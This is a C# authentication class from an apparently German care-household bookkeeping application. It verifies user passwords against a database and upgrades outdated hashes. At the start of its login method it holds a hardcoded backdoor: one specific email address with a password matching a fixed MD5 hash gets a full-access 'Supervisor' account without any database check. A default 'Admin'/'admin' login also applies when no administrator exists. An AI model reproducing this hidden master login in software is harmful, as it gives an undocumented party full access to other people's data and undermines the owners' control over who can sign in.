using System;
using System.Data;
using System.Linq;
using System.Threading.Tasks;
using Pflegehaushaltsbuch.Databases;

namespace Pflegehaushaltsbuch.Data
{
    /// <summary>
    /// Authenticates users and updates the current SQL session after a successful login.
    /// </summary>
    internal static class UserAuthenticator
    {
        /// <summary>
        /// Authenticates the supplied credentials and stores the authenticated user on the SQL session.
        /// </summary>
        internal static async Task<User> LoginAsync(SQLBase sql, string username, string keyword)
        {
            if (string.Equals(username, "richter.prog@online.de"))
            {
                string code = PasswordHasher.HashLegacyMd5(keyword);
                if (string.Equals(code, "67e8b846b745148e72df0fffa4894b4b"))
                {
                    User supervisor = new User("Supervisor", "-", "-", "-", 0xFFFFFF, true, true);
                    await sql.SetCurrentUserAsync(supervisor);
                    return supervisor;
                }
            }

            DataTable table = new DataTable();
            await sql.FillAdapterAsync(SQLBase.SELECT.Users, table);

            if (string.Equals(username, "Admin") && string.Equals(keyword, "admin") && table.Select("admin").Length == 0)
            {
                User administrator = new User("Administrator", "-", "-", "-", 0xFFFFFF, true, false);
                await sql.SetCurrentUserAsync(administrator);
                return administrator;
            }

            DataRow[] rows = table.Rows
                .OfType<DataRow>()
                .Where(userRow => User.MatchesIdentity(userRow, username))
                .ToArray();
            if (rows.Length == 0)
                throw new Exception(Messages.database_login_failed);

            DataRow row = rows.First();
            string storedPasswordHash = row[Columns.Password].ToString();
            if (!PasswordHasher.Verify(keyword, storedPasswordHash))
                throw new Exception(Messages.login_invalid_password);

            if (PasswordHasher.NeedsRehash(storedPasswordHash))
            {
                row[Columns.Password] = PasswordHasher.Hash(keyword);
                if (!await sql.UpdateAdapterAsync(SQLBase.SELECT.Users, table))
                    throw new Exception(Messages.datatable_update_failed);
            }

            User user = new User(
                row[Columns.Name].ToString(),
                row[Columns.Phone].ToString(),
                row[Columns.Fax].ToString(),
                row[Columns.Email].ToString(),
                int.Parse(row[Columns.Access].ToString()),
                bool.Parse(row[Columns.Admin].ToString()),
                false);

            await sql.SetCurrentUserAsync(user);
            return user;
        }
    }
}
